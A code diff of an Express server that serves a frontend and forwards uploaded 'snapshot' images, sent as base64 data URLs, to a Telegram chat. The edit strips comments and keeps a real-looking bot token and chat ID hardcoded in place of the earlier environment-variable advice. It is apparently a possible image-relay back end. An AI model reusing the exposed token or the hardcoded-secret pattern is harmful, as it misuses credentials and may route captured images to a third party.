@@ -1,4 +1,3 @@
-// server/index.js
 const path = require('path');
 const express = require('express');
 const cors = require('cors');
@@ -8,8 +7,7 @@ const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Defaults (use your provided token & chat id here).
-// Recommended: override via environment variables in production.
+// Keep hardcoded defaults
 const DEFAULT_BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
 const DEFAULT_CHAT_ID = '5574741182';
 
@@ -21,13 +19,13 @@ if (!BOT_TOKEN || !CHAT_ID) {
 }
 
 app.use(cors());
-app.use(express.json({ limit: '10mb' })); // accept large data URLs
+app.use(express.json({ limit: '10mb' }));
 
-// Serve built static files from dist
+// Serve built frontend
 const distPath = path.join(__dirname, '..', 'dist');
 app.use(express.static(distPath));
 
-// API: receive data URL and forward to Telegram
+// API route
 app.post('/api/upload-photo', async (req, res) => {
   try {
     if (!BOT_TOKEN || !CHAT_ID) {
@@ -42,18 +40,16 @@ app.post('/api/upload-photo', async (req, res) => {
     const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
     if (!matches) return res.status(400).json({ ok: false, error: 'Invalid data URL format' });
 
-    const mime = matches[1]; // e.g., image/jpeg
+    const mime = matches[1];
     const b64 = matches[2];
     const buffer = Buffer.from(b64, 'base64');
 
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
-    // filename set to snapshot.jpg (Telegram accepts)
     form.append('photo', buffer, { filename: 'snapshot.jpg', contentType: mime });
     if (caption) form.append('caption', caption);
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
     const resp = await fetch(url, { method: 'POST', body: form });
     const json = await resp.json();
 
@@ -69,7 +65,7 @@ app.post('/api/upload-photo', async (req, res) => {
   }
 });
 
-// Fallback: serve index.html
+// SPA fallback
 app.get('*', (req, res) => {
   res.sendFile(path.join(distPath, 'index.html'));
 });
@@ -77,3 +73,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+  
